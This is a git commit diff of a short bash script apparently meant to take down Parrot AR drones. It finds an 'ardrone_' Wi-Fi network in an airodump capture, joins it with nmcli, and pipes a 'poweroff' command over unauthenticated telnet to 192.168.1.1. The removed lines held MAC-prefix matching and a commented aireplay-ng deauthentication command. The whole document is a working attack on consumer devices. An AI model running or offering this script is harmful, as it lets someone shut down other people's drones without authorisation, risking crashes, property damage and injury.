321b897ac42fa5186ee439f697bf14dda3bb6055
djb0023 <djb0023@uah.edu>
2017-04-11 18:02:35 -0500

    Add files via upload

--- deauth_AR_telnet.bash
+++ deauth_AR_telnet.bash
@@ -2,48 +2,15 @@
 
 pkill xterm
 pkill airodump
-apMAC=$(grep -m 1 -Eo "12:0F:7E:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
 
-if [[ $apMAC == "" ]]; then
-apMAC=$(grep -m 1 -Eo "90:03:B7:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
-
-
-elif [[ $apMAC == "" ]]; then
-apMAC=$(grep -m 1 -Eo "A0:14:3D:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
-
-
-elif [[ $apMAC == "" ]]; then
-apMAC=$(grep -m 1 -Eo "00:26:7E:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
-
-
-elif [[ $apMAC == "" ]]; then
-apMAC=$(grep -m 1 -Eo "00:12:1C:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
-
-
-elif [[ $apMAC == "" ]]; then
-apMAC=$(grep -m 1 -Eo "90:3A:E6:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
-
-
-elif [[ $apMAC == "" ]]; then
-apMAC=$(grep -m 1 -Eo "72:05:7E:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
-
-
-elif [[ $apMAC == "" ]]; then
-apMAC=$(grep -m 1 -Eo "OA:OF:7E:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
+apName=$(grep -Eo "ardrone_[0-9A-F]{6}" dump-01.csv)
+if [ -z "$apName" ]; then
+	echo "Parrot not found"
 fi
 
-##apMAC="0A:0F:7E:50:04:E7"
-
-apCh=$(grep -m 1 -E $apMAC dump-01.csv | cut -d "," -f 4)
-apName=$(grep -m 1 -E $apMAC dump-01.csv | cut -d "," -f 14)
-
-echo $apCh && echo $apName
 sudo ifconfig wlan0 up
-sudo iwconfig wlan0 channel $apCh
 nmcli dev wifi connect $apName
-#sudo xterm -hold -e aireplay-ng -0 0 -a $apMAC wlan0
-(echo open "192.168.1.1"
-echo "poweroff") | telnet
+(echo open "192.168.1.1"; sleep 1; echo "poweroff";) | telnet
 
 
 #12:0F:7E - Parrot MAC
